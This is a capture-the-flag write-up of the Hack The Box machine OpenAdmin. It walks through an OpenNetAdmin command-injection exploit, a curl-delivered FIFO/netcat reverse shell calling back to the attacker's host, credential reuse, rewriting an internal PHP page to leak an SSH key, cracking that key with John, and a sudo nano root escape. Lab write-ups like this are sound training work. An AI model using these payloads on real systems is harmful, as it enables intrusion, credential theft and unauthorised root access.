---
tags: [oscp, boxes, htb, linux, opennetadmin, rce, password-reuse, internal-service, ssh-key, john-the-ripper, sudo, nano, completed]
platform: HTB
os: Linux (Ubuntu 18.04)
hostname: openadmin
domain: N/A
ip: $BoxIP
difficulty: Easy
status: complete
---

# HTB: OpenAdmin, Full Walkthrough

## The gist

OpenAdmin exposes an Apache default page, but directory enumeration finds a static music site linking to OpenNetAdmin 18.1.1. The ONA command injection, tracked as CVE-2019-26057 in the box brief, gives a shell as `www-data`, where a readable database configuration reveals a password reused by `jimmy` for SSH. Jimmy owns an internal web application that runs as `joanna`; rewriting its PHP exposes Joanna's encrypted SSH key, whose passphrase is cracked with John. Joanna's passwordless `sudo nano /opt/priv` rule then provides a root shell through the nano command escape.

## Box information

| Field | Value |
|---|---|
| Platform | HTB |
| OS | Linux (Ubuntu 18.04) |
| Hostname | openadmin |
| Domain | N/A |
| Difficulty | Easy |
| IP | `$BoxIP` |

## Variables

```bash
boxset BoxName OpenAdmin
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset Username jimmy
# Set Password only after validating a discovered credential.
boxset Port 4444
```

## 1. Reconnaissance and port scan

A full TCP scan checks every port instead of relying on the common top 1,000. The service scan then identifies the SSH and HTTP versions, while the UDP scan checks whether an overlooked datagram service changes the attack surface.

```bash
sudo nmap -p- --min-rate 10000 -oA nmap/${BoxName}_allports $BoxIP
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-01 23:11 +0100
Nmap scan report for 10.129.1.69
Host is up (0.016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
sudo nmap -sU --top-ports 100 -oA nmap/${BoxName}_udp $BoxIP
```

```text
All 100 scanned ports on 10.129.1.69 are in ignored states.
Not shown: 52 closed udp ports (port-unreach), 48 open|filtered udp ports (no-response)
Nmap done: 1 IP address (1 host up) scanned in 48.81 seconds
```

The targeted scan confirms an older Ubuntu SSH daemon and Apache web server. SSH is useful later for lateral movement, but HTTP is the first priority because the web root may hide an application or a link to one.

```bash
sudo nmap -sC -sV -p 22,80 -oA nmap/${BoxName}_services $BoxIP
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


SCREENSHOT: Full TCP scan showing SSH and HTTP as the only open TCP services.

nhnnnn
SCREENSHOT: Service scan identifying OpenSSH 7.6p1 and Apache 2.4.29.

> [!tip] ⚡ Efficiency
> Run the full TCP scan and the focused service scan early. The UDP result has no useful response, so continuing with broad UDP enumeration would add delay without changing the route.

## 2. Web enumeration and content discovery

The root page is the stock Apache page, so its source does not identify the real application. A directory scan with common web extensions finds several directories, and inspecting the first promising static site reveals an internal login link that points directly to `/ona/`.

```bash
curl -s http://$BoxIP/ | grep -i 'href\|src\|comment\|<!--'
curl -s http://$BoxIP/robots.txt
```

```text
<!-- Apache default-page boilerplate and Ubuntu documentation links -->
404 Not Found
```

```bash
gobuster dir -u http://$BoxIP/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html \
  -t 40 \
  -o loot/gobuster.txt
```

```text
index.html           (Status: 200) [Size: 10918]
music                (Status: 301)
artwork              (Status: 301)
sierra              (Status: 301)
server-status        (Status: 403)
```

```bash
curl -s http://$BoxIP/music/ | grep -i 'href\|ona\|admin\|login'
```

```text
<a href="../ona" class="login">Login</a>
```

> [!tip] ⚡ Efficiency
> Grep the source of the first discovered directory for `href`, `login`, and application names before manually browsing every directory. The music page exposed `/ona/` immediately.

![[2.gobuster.png]]
SCREENSHOT: Gobuster results showing the music, artwork, and sierra directories.

![[3.1http-music.png]]
SCREENSHOT: Music site source showing the link to `/ona/`.

## 3. OpenNetAdmin identification

Version identification turns a generic web page into a version-specific search. The ONA title and version marker confirm OpenNetAdmin 18.1.1, which can then be matched against the local Exploit-DB index.

```bash
curl -s http://$BoxIP/ona/ | grep -i 'version\|title\|generator\|ona'
```

```text
<title>OpenNetAdmin :: 0wn Your Network</title>
Your version &nbsp;&nbsp;&nbsp;= v18.1.1
```

![[3.2http-ona-version.png]]
SCREENSHOT: OpenNetAdmin page showing the product and version.

## 4. Exploit research and RCE confirmation

Searchsploit is a local index of Exploit-DB entries, so it is useful when the product and version are known. The matching ONA 18.1.1 shell script shows that the `xajaxargs[]` `ip=>` value is passed into a command context. Reading the script exposes the request structure without executing Metasploit.

```bash
searchsploit opennetadmin
cat /usr/share/exploitdb/exploits/php/webapps/47691.sh
```

```text
OpenNetAdmin 13.03.01 - Remote Code Execution       | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit     | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution         | php/webapps/47691.sh
```

Test the injection with `id` before sending a reverse shell. `BEGIN` and `END` markers make the command output easy to isolate from the surrounding XML response.

```bash
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";id;echo \"END\"&xajaxargs[]=ping" \
  http://$BoxIP/ona/ | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![[4.1searchsploit.png]]
SCREENSHOT: Searchsploit result showing the OpenNetAdmin 18.1.1 RCE entry.

![[4.2searchsploit-exploit.png]]
SCREENSHOT: Reviewed Exploit-DB source showing the vulnerable request structure.

![[5.1rce-confirmed.png]]
SCREENSHOT: RCE confirmation showing the `www-data` identity.

**Reference:** [Exploit-DB 47691](https://www.exploit-db.com/exploits/47691) documents the OpenNetAdmin 18.1.1 RCE. The vulnerable request was reproduced manually, with no Metasploit execution.

## 5. Reverse shell and stabilisation

The initial reverse-shell attempts using Bash `/dev/tcp` were unreliable in this command context. The working payload uses a FIFO, or named pipe, to connect `/bin/sh` to netcat and avoids Bash-only redirection syntax. Start the listener before triggering the request.

```bash
listener
```

```text
[+] Listening on :4444  (Ctrl+C to stop)
Listening on 0.0.0.0 4444
```

```bash
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>%261|nc $LocalIP $Port >/tmp/f&xajaxargs[]=ping" \
  http://$BoxIP/ona/
```

```text
Connection received on 10.129.1.69 59762
sh: 0: can't access tty; job control turned off
$
```

Upgrade the basic shell to a pseudo-terminal, restore the local terminal after backgrounding it, and set `TERM` so interactive commands behave normally.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter twice
export TERM=xterm
whoami && id && hostname && ip a
```

```text
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
openadmin
inet 10.129.1.69/16
```

> [!warning] 💡 Gotcha
> A payload containing `>&` must URL-encode the ampersand as `%26` when it is embedded in a `curl -d` string. The FIFO and netcat payload avoids that parsing problem and was the reliable route in this run. See [RevShells](https://www.revshells.com/) for shell payload variants.

![[6.1foothold.png]]
SCREENSHOT: Stabilised `www-data` shell showing identity and network details.

## 6. Local enumeration and database credential discovery

Once the shell is stable, inspect application configuration before attempting blind privilege escalation. ONA's database settings are readable by `www-data` and contain a cleartext database credential. Do not print the sensitive value into notes; record it privately and validate it only against authorized services.

```bash
ls
cd config
ls
cd ..
cd local
ls
cd config
ls
cat database_settings.inc.php
```

```text
database_settings.inc.php  motd.txt.example  run_installer
'db_login' => 'ona_sys',
'db_passwd' => '[REDACTED]',
'db_database' => 'ona_default',
```

The account and password were stored privately with the box loot helper. The manual run then validated the recovered password by SSHing as `jimmy`, demonstrating password reuse.

```bash
loot cred ona_sys [REDACTED]
boxset Username jimmy
boxset Password [REDACTED]
ssh jimmy@$BoxIP
```

```text
Welcome to Ubuntu 18.04.3 LTS
jimmy@openadmin:~$
```

> [!tip] ⚡ Efficiency
> Checking application configuration immediately after obtaining the web shell is faster than starting broad SUID or kernel searches. The database settings provided a credential that worked for SSH.

![[7.1db-creds.png]]
SCREENSHOT: ONA database configuration showing the database account and redacted password field.

## 7. Internal service and Apache virtual-host enumeration

After SSH access as Jimmy, repeat local listener checks because services bound to `127.0.0.1` are invisible from the external scan. Port `52846` is paired with an Apache virtual-host configuration that reveals both the internal document root and the account used to run it.

```bash
ss -lntp
ls /etc/apache2/sites-enabled/
cat /etc/apache2/sites-enabled/internal.conf
```

```text
127.0.0.1:3306
127.0.0.1:52846
0.0.0.0:22
*:80

internal.conf  openadmin.conf

Listen 127.0.0.1:52846
ServerName internal.openadmin.htb
DocumentRoot /var/www/internal
AssignUserID joanna joanna
```

The `AssignUserID` directive means requests to this virtual host execute as `joanna`, which becomes important when the application reads a file from Joanna's home directory.

> [!tip] ⚡ Efficiency
> When `ss` shows an unknown localhost port and Apache is already confirmed, read `/etc/apache2/sites-enabled/` immediately. This reveals the service ownership and document root faster than trying to fingerprint the port externally.

![[10.1apache-configs.png]]
SCREENSHOT: Apache configuration showing the internal listener, document root, and `AssignUserID` directive.

![[8.1hhs-jimmy.png]]
SCREENSHOT: SSH session as Jimmy with the local listeners and internal Apache configuration identified.

## 8. Internal application source review

Jimmy owns `/var/www/internal`, so source review is more useful than guessing the internal login password. The login page contains a hardcoded SHA-512 comparison, and the database password does not match it. The intended route is the writable web root, not repeated authentication attempts.

```bash
ls -la /var/www/internal/
cat main.php
cat index.php
```

```text
drwxrwx--- 2 jimmy internal ... .
-rwxrwxr-x 1 jimmy internal ... index.php
-rwxrwxr-x 1 jimmy internal ... main.php

# main.php runs:
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
```

The internal service is reachable only from the target itself. The Apache configuration shows that it serves the application as Joanna, so a page that reads Joanna's private key will disclose it to a local curl request.

> [!warning] 💡 Gotcha
> The database password is not the internal web application's password. The source contains a separate hardcoded hash. Because Jimmy can write the application files, remove the session dependency and use the application runtime to read the key instead of wasting time on password variations.

## 9. Rewrite the internal page and obtain Joanna's key

Replace `main.php` with a minimal page that reads Joanna's key. This is a controlled file modification made possible by Jimmy's ownership of the internal web root. The request must be made from the target because the service listens on loopback.

```bash
rm /var/www/internal/main.php
cat > /var/www/internal/main.php << 'EOF'
<?php
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
EOF

curl -s http://127.0.0.1:52846/main.php
```

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,...
[REDACTED key body]
-----END RSA PRIVATE KEY-----
Don't forget your "ninja" password
```

![[9.1ss-internal.png]]
SCREENSHOT: Internal service response showing the encrypted RSA private-key marker and the password hint.

> [!tip] ⚡ Efficiency
> Reading `main.php` exposed the exact `shell_exec` call and showed that the page already reads Joanna's key. No internal web login or SSH tunnel was required after the direct SSH foothold; rewrite the owned file and query the loopback service.

## 10. Recover the key passphrase with John

An encrypted private key is not immediately usable, but `ssh2john` converts its encryption metadata into a John-compatible hash. John then tests the supplied wordlist against that hash. Keep the key and hash in private loot and do not place the recovered passphrase in the write-up.

```bash
nano $BoxDir/loot/joanna_id_rsa
chmod 600 $BoxDir/loot/joanna_id_rsa
ssh2john $BoxDir/loot/joanna_id_rsa > $BoxDir/loot/joanna_id_rsa.hash
john $BoxDir/loot/joanna_id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
1g 0:00:00:02 DONE
Session completed.
```

> [!tip] ⚡ Efficiency
> Use `ssh2john` followed by `john` immediately when an encrypted SSH key is found. Manual guessing based only on the `ninja` hint is slower and less reliable.

**Reference:** [John the Ripper documentation](https://www.openwall.com/john/) explains the cracking workflow, and the key was used only for this authorized box.

## 11. SSH as Joanna and confirm the user flag path

Use the cracked passphrase when OpenSSH prompts for the key. Confirm the account and inspect the home directory, but do not print the flag value into the transcript or write-up.

```bash
ssh -i $BoxDir/loot/joanna_id_rsa joanna@$BoxIP
ls
cat user.txt
```

```text
Welcome to Ubuntu 18.04.3 LTS
joanna@openadmin:~$ ls
user.txt
[FLAG REDACTED]
```

The user flag was confirmed at `/home/joanna/user.txt`.

## 12. Sudo enumeration

`sudo -l` displays the commands Joanna may run with elevated privileges. The result is a passwordless rule for nano editing a fixed file, which is a classic GTFOBins path because nano can execute a shell command from its interface.

```bash
sudo -l
```

```text
User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

## 13. Nano shell escape to root

Run the exact permitted nano command, then use nano's read-file and execute-command shortcuts. `Ctrl-R` opens the read-file prompt, and `Ctrl-X` changes that prompt into an execute-command prompt. The command replaces the prompt with a root shell connected to the terminal.

```bash
sudo /bin/nano /opt/priv
```

Inside nano:

```text
Ctrl-R
Ctrl-X
reset; sh 1>&0 2>&0
Enter
```

```bash
whoami && id
cat /root/root.txt
```

```text
root
uid=0(root) gid=0(root) groups=0(root)
[FLAG REDACTED]
```

The root flag was confirmed at `/root/root.txt`.

> [!warning] 💡 Gotcha
> The nano sequence is terminal-sensitive. A proper interactive TTY is required for the control keys to register. If nano remains open, repeat `Ctrl-R`, `Ctrl-X`, enter `reset; sh 1>&0 2>&0`, and press Enter.

**Reference:** [GTFOBins nano](https://gtfobins.github.io/gtfobins/nano/#sudo) documents the sudo nano shell escape.

![[11.1interna-source.png]]
SCREENSHOT: Internal PHP source showing the key disclosure logic.

## 14. Clean-down

Restore the internal page after using the writable web root, remove local key and hash material, and stop any listeners. The manual log records an attempted cleanup edit followed by shell interruption, so the important restoration command is shown explicitly here.

```bash
cat > /var/www/internal/main.php << 'EOF'
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
EOF
boxdone
```

The logged run restored the modified PHP page and ended with `boxdone`. After the session, the staged local key, John hash, credential and flag files, Gobuster output, and Nmap output were moved to trash while preserving the raw log and screenshots.

## RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Start Here|Step 1 - Start Here]]
- [[RUNBOOK V2/Port Triage|Step 2 - Port Triage]]
- [[RUNBOOK V2/Linux - Service Scan|Step 3 - Linux Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum|Step 5 - Linux Web Enum]]
- [[RUNBOOK V2/Linux - CMS Check|Step 6 - Linux CMS Check]]
- [[RUNBOOK V2/Linux - Exploit Search|Step 10 - Linux Exploit Search]]
- [[RUNBOOK V2/Linux - RCE to Shell|Step 11 - Linux RCE to Shell]]
- [[RUNBOOK V2/Linux - Shell Stabilise|Step 12 - Linux Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum|Step 13 - Linux Local Enum]]
- [[RUNBOOK V2/Linux - Credential Search|Step 17 - Linux Credential Search]]
- [[RUNBOOK V2/Linux - Sudo Check|Step 14 - Linux Sudo Check]]
- [[RUNBOOK V2/Linux - Clean Down|Step 21 - Linux Clean Down]]

## Attack Chain

1. Full TCP and service scans found SSH and Apache.
2. Gobuster found the music site, whose source linked to `/ona/`.
3. OpenNetAdmin 18.1.1 was identified and matched to a public RCE.
4. Manual command injection produced a reverse shell as `www-data`.
5. ONA configuration exposed a database credential reused for Jimmy's SSH login.
6. Jimmy's writable internal web root and Apache `AssignUserID joanna` directive exposed Joanna's encrypted SSH key.
7. John cracked the key passphrase and SSH provided Joanna's user access.
8. Joanna's passwordless sudo rule for nano yielded a root shell.

## Credentials

| Account | Source | Use |
|---|---|---|
| `ona_sys` | ONA database configuration | Credential reuse for Jimmy's SSH login |
| `jimmy` | Reused ONA database credential | SSH foothold and writable internal application |
| `joanna` | Cracked SSH key passphrase | SSH lateral movement |

## Flags

- `user.txt`: confirmed at `/home/joanna/user.txt`
- `root.txt`: confirmed at `/root/root.txt`

## Key lessons

- Read static site source and application configuration before launching broad guessing or privilege scans.
- A localhost-only service may be reachable directly from a shell, and Apache vhost configuration can reveal which user executes it.
- An encrypted SSH key is still useful evidence: convert it with `ssh2john`, crack it with John, and then validate the key with SSH.
- [ippsec.rocks](https://ippsec.rocks/) provides additional box walkthroughs for practising the same reconnaissance and pivoting habits.

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- web application foothold followed by local service enumeration and command injection.
- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- web foothold followed by local credential and privilege escalation work.
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- Linux web application exploitation and sudo escalation.

## Checklist

- [x] Context, pre-box brief, and post-box brief read
- [x] Full TCP and UDP reconnaissance completed
- [x] Service and web enumeration completed
- [x] OpenNetAdmin version identified
- [x] Manual RCE confirmed without Metasploit
- [x] Shell stabilised as `www-data`
- [x] Database credential reuse validated for SSH
- [x] Internal service and Apache execution user identified
- [x] Joanna's encrypted SSH key recovered
- [x] Key passphrase cracked with John
- [x] User flag path confirmed
- [x] Sudo nano escape completed
- [x] Root flag path confirmed
- [x] Target and local clean-down completed
- [x] `boxdone` completed
